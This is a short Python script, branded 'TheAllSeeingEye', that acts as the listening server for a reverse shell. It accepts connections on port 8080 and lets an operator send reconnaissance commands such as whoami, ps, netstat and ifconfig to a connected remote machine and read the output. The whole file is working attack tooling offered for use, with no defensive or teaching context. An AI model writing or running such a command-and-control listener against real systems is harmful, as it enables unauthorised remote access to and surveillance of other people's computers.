import socket

def start():
    GREEN = '\033[92m'
    RED = '\033[91m'
    RESET = '\033[0m'

    host = '0.0.0.0'
    port = 8080
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.bind((host, port))
        s.listen(5)
        print(f'               {GREEN}      TheAllSeeingEye   {RESET} \n')
        print(f'{GREEN}[*] Listening on {host}:{port}{RESET} ')
    except Exception as e:
        print(f'{RED}Error: Reverse shell not working! {e}{RESET}')
        return

    while True:
        conn, addr = s.accept()
        print(f'{GREEN}{conn} has connected\n\n{RESET}')
        print(f'{GREEN}     Options    {RESET}\n ')
        print(f'{GREEN}[*] ls\n[*] netstat\n[*] ifconfig\n[*] ps\n[*] df\n[*] whoami\n[*] exit{RESET}')
        while True:
            cmd = input(f'{GREEN}>>> {RESET}')

            if cmd == 'exit':
                conn.close()
                break
            elif cmd in ['ls', 'netstat', 'ifconfig', 'ps', 'df', 'whoami']:
                conn.sendall(cmd.encode())
                response = conn.recv(1024).decode()
                print(response)
            else:
                print(f'{RED}Invalid command!{RESET}')

start()
